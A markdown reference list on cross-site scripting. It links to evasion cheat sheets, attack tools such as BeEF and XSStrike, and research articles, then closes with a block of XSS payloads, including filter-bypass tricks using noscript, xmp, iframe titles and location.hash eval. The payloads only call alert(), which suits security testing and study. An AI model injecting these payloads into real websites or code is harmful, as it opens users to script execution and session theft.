# xss sets
[XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
[Sec-wiki XSS](https://www.sec-wiki.com/news/search?wd=xss)  
[XSS过滤绕过速查表](https://www.freebuf.com/articles/web/153055.html)  
[xssed](http://xssed.com)  

# Tools
[Beef](https://github.com/beefproject/beef)  
[XSStrike](https://github.com/s0md3v/XSStrike)  
[xssor2](https://github.com/evilcos/xssor2)  
[xssfork](https://github.com/bsmali4/xssfork)  
[XSS-Filter-Evasion-Cheat-Sheet-CN](https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN)  

# blogs
[BRUTE XSS](http://brutelogic.com.br/blog/)  

# articles
[Bypass XSS Protection with xmp, noscript, noframes.. etc](https://www.hahwul.com/2019/04/bypass-xss-protection-with-xmp-noscript-etc....html)  
[XSS attacks on Googlebot allow search index manipulation](https://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)  
[A WOrmable XSS on HackMD](https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html)  
[Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)[pocs](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
[Security Safe HTML](http://www.gwtproject.org/doc/latest/DevGuideSecuritySafeHtml.html)  
[Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems](https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html)  
[Fighting XSS with Isolated Scripts](https://sirdarkcat.blogspot.com/2017/01/fighting-xss-with-isolated-scripts.html)  
[Google搜索中的突变XSS](https://xz.aliyun.com/t/4865)  
[特斯拉上价值10000美元的XSS漏洞](https://nosec.org/home/detail/2781.html)  

[About Google](https://nosec.org/home/detail/2449.html)  
[Xss Sets](https://www.hahwul.com/2019/04/bypass-xss-protection-with-xmp-noscript-etc....html)  

```JavaScript
<script>alert(1)</script>
"><script>alert(1)</script>
"><script>alert(document.domain)</script>
"><script>alert(1)</script><" 
'"><script>alert(1)</script>
'"><script>alert(1)</script>"
';"<script>alert(1)</script>
</script><script>alert(1)</script>
<img src='' onerror=alert(/poc/)>
<img src=1 alt="xss＂onerror=alert(1);//">
<DIV STYLE="width: ｅxpression(alert('XSS'));">
"><BODY ONLOAD=alert(1)>,1/

</title><script>alert(/poc/)</script>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> 
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<noscript><p title="</noscript><svg/onload=alert(1)>">
<xmp><p title="</xmp><svg/onload=alert(1)>">
<noframes><p title="</noframes><svg/onload=alert(1)>">
<iframe><p title="</iframe><svg/onload=alert(1)>">
<iframe style="visibility:hidden"><p title="</iframe><svg/onload=alert(1)>">
<svg onload=alert(document.domain)>

location:
<body/onload=eval(location.hash.slice(1))>#alert(1)
<body/onload=setTimeout(location.hash.substr(1))>#alert(1)

```
